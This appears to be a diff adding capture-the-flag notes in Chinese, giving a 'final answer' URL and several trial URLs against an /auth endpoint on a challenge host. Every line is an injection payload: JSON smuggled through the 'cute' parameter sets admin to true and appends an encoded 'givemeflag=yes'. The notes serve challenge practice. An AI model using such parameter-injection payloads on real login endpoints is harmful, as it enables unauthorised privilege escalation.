@@ -1,0 +1,20 @@
+## 最終答案
+https://owohub.zoolab.org/auth?username=aaa&cute=true,"admin":true}%26givemeflag=yes%23true
+
+## 以下是各種測試過程，看看就好
+https://owohub.zoolab.org:9487/?data={"username":"hwww","admin":true,"cute":true}&givemeflag=yes
+
+
+https://owohub.zoolab.org/auth?username=sdfs&cute=false
+https://owohub.zoolab.org/auth?username=FLAG&cute=true
+
+
+https://owohub.zoolab.org/auth?username=aaa&cute=true,"admin":true
+https://owohub.zoolab.org/auth?username=aaa&cute=true,"admin":true}//true
+https://owohub.zoolab.org/auth?username=aaa&cute=true,"admin":true}'//true
+https://owohub.zoolab.org/auth?username=aaa&cute=true,"admin":true}&givemeflag=yes'//true
+https://owohub.zoolab.org/auth?username=aaa&cute=true,"admin":true}%26givemeflag=yes'	%2F	%2F//true//true
+ssd //
+{"username":"${username}","admin":false,"cute": true, "admin": true } &givemeflag=yes '//true }&givemeflag=no
+
+
